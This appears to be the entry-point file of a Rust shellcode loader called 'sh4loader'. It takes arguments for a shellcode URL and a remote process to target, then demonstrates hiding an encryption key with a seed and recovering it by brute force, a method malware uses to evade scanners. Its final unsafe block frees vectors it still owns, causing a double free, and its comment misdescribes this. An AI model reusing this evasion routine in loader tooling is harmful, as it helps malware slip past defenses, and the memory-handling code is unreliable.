use clap::Parser;
use console::style;

use sh4loader::brute_force_decryption;
use sh4loader::config::args::Args;
use sh4loader::config::structs::LogLevel;
use sh4loader::config::structs::BANNER;
use sh4loader::config::structs::KEY_SIZE;
use sh4loader::generate_protected_key;
use sh4loader::generate_random_key;
use sh4loader::print_hex;
use sh4loader::print_info;

fn main() {
    println!("{}", style(BANNER).red());

    let args = Args::parse();
    let shellcode_url = args.shellcode_url;
    let module = args.modules;
    let output_path = args.output_path;
    let remote_process = args.remote_process;

    print_info(&shellcode_url, LogLevel::Information);
    print_info(&module, LogLevel::Information);
    print_info(&output_path, LogLevel::Information);
    print_info(&remote_process, LogLevel::Information);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(0xBA, &mut real_key);

    // Print the encrypted key
    println!("[+] Protected Key: ");
    print_hex(&protected_key);

    println!("\n\t\t\t-------------------------------------------------\n\n");

    // Brute-force decryption
    println!("[i] Brute Forcing The Seed ... ");
    match brute_force_decryption(0xBA, &protected_key, &mut real_key) {
        Some(key_byte) => {
            println!("[+] Calculated Key Byte: 0x{:02X} \n", key_byte);
            println!("[+] Original Key: ");
            print_hex(&real_key);
        }
        None => println!("[!] FAILED \n"),
    }

    // Free allocated memory (not strictly necessary with Vec)
    unsafe {
        let _ = Vec::from_raw_parts(protected_key.as_mut_ptr(), KEY_SIZE, KEY_SIZE);
        let _ = Vec::from_raw_parts(real_key.as_mut_ptr(), KEY_SIZE, KEY_SIZE);
    }

    // println!("[#] Press <Enter> To Quit ... ");
    // let _ = std::io::stdin().read(&mut [0]);
}

